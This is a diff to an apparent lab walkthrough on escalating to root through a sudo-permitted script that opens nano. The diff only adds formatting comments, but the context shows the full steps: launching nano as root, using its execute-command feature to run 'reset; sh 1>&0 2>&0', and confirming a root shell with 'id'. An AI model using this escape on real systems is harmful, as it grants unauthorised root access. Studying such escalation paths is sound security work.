@@ -13,6 +13,7 @@ When a user is permitted to run `nano` as root via `sudo` (or a script that invo
 
 ### 1. Trigger the vulnerable script
 
+<!-- cmd: linux -->
 ```bash
 sudo /bin/bash /opt/rootkit.sh
 # Choose the 'read' option which triggers: /bin/nano /root/report.txt
@@ -25,12 +26,14 @@ Once inside `nano`:
 2. Press `Ctrl + X` (Execute Command).
 3. Type the following command and press Enter:
 
+<!-- cmd: linux -->
 ```bash
 reset; sh 1>&0 2>&0
 ```
 
 ### 3. Verify Access
 
+<!-- cmd: linux -->
 ```bash
 id
 # uid=0(root) gid=0(root) groups=0(root)
